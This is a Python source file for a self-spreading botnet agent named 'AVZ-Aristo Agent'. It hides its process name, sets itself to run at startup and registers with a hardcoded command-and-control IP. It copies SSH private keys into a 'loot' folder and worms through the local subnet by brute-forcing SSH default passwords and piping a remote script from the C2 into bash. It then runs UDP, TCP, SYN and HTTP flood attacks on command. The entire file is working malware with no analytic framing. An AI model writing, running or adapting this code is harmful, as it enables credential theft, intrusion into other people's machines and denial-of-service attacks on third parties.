#!/usr/bin/env python3
# AVZ-Aristo Agent v29.0 – Worm, ключи, маскировка
import socket, json, time, os, platform, subprocess, threading, random, ipaddress, sys, glob, shutil

C2_HOST = "80.249.146.202"
C2_PORT = 80
XOR_KEY = random.randint(1, 255)
PROC_NAME = random.choice(["telnetd", "udhcpc", "ntpclient", "klogd", "syslogd"])

def mask_process():
    try:
        if sys.platform == 'linux':
            subprocess.run(["prctl", "--name", PROC_NAME, str(os.getpid())])
    except:
        pass

def xor_encrypt(data, key):
    if isinstance(data, str):
        data = data.encode()
    return bytes([b ^ key for b in data])

def xor_decrypt(data, key):
    return xor_encrypt(data, key)

def get_info():
    return {
        "hostname": platform.node(),
        "os": f"{platform.system()} {platform.release()}",
        "cpu": f"{os.cpu_count()} cores" if hasattr(os, 'cpu_count') else "unknown",
        "ram": "unknown"
    }

def auto_start():
    try:
        if platform.system() == 'Linux':
            cron_line = f"@reboot /usr/bin/python3 {os.path.abspath(__file__)} &\n"
            with open("/tmp/agent_cron", "w") as f:
                f.write(cron_line)
            subprocess.run("crontab /tmp/agent_cron", shell=True)
        elif platform.system() == 'Windows':
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as regkey:
                winreg.SetValueEx(regkey, "AVZ Agent", 0, winreg.REG_SZ, f'"{sys.executable}" "{os.path.abspath(__file__)}"')
    except:
        pass

def register():
    try:
        s = socket.socket(); s.settimeout(5)
        s.connect((C2_HOST, C2_PORT))
        s.sendall(json.dumps({**get_info(), "xor_key": XOR_KEY}).encode())
        s.close()
    except:
        pass

def steal_creds():
    """Копирует SSH-ключи и конфиги"""
    loot_dir = os.path.join(os.getcwd(), "loot")
    os.makedirs(loot_dir, exist_ok=True)
    for path in [os.path.expanduser("~/.ssh/id_rsa"), os.path.expanduser("~/.ssh/id_dsa"), "/etc/ssh/ssh_host_rsa_key"]:
        if os.path.exists(path):
            shutil.copy(path, loot_dir)

def worm_spread():
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
    except:
        return
    network = ipaddress.IPv4Network(f"{local_ip}/24", strict=False)
    for host in network.hosts():
        ip = str(host)
        try:
            s = socket.socket()
            s.settimeout(0.5)
            s.connect((ip, 22))
            s.close()
            for u, p in [("root", "root"), ("admin", "admin"), ("pi", "raspberry")]:
                cmd = f"sshpass -p '{p}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 {u}@{ip} 'wget -O- http://{C2_HOST}:8080/agent_bash.sh | bash'"
                try:
                    subprocess.run(cmd, shell=True, timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                except:
                    pass
        except:
            pass

def execute_attack(cmd):
    target = cmd.get("target")
    method = cmd.get("method", "GET")
    threads = int(cmd.get("threads", 10))
    port = int(cmd.get("port", 80))
    if method == "UDP":
        def udp_flood():
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            msg = b'\x00' * 1024
            for _ in range(threads):
                try:
                    s.sendto(msg, (target, port))
                except:
                    pass
        threading.Thread(target=udp_flood, daemon=True).start()
    elif method == "TCP":
        def tcp_flood():
            for _ in range(threads):
                try:
                    s = socket.socket()
                    s.connect((target, port))
                    s.send(b'\x00' * 1024)
                    s.close()
                except:
                    pass
        threading.Thread(target=tcp_flood, daemon=True).start()
    elif method == "SYN":
        try:
            from scapy.all import IP, TCP, send
            def syn_flood():
                for _ in range(threads):
                    pkt = IP(dst=target) / TCP(dport=port, flags='S')
                    send(pkt, verbose=False)
            threading.Thread(target=syn_flood, daemon=True).start()
        except ImportError:
            pass
    else:
        import requests
        def http_flood():
            for _ in range(threads):
                try:
                    if method == "POST":
                        requests.post(target, data=b'data', timeout=2)
                    else:
                        requests.get(target, timeout=2)
                except:
                    pass
        threading.Thread(target=http_flood, daemon=True).start()

def send_ping():
    try:
        s = socket.socket(); s.settimeout(5)
        s.connect((C2_HOST, C2_PORT))
        s.sendall(xor_encrypt("ping", XOR_KEY))
        data = s.recv(4096)
        s.close()
        if data and data != b"no commands":
            return json.loads(xor_decrypt(data, XOR_KEY).decode())
    except:
        pass
    return []

def main():
    mask_process()
    auto_start()
    register()
    steal_creds()
    threading.Thread(target=worm_spread, daemon=True).start()
    while True:
        cmds = send_ping()
        for cmd in cmds:
            if cmd.get("type") == "attack":
                execute_attack(cmd)
        time.sleep(15)

if __name__ == "__main__":
    main()
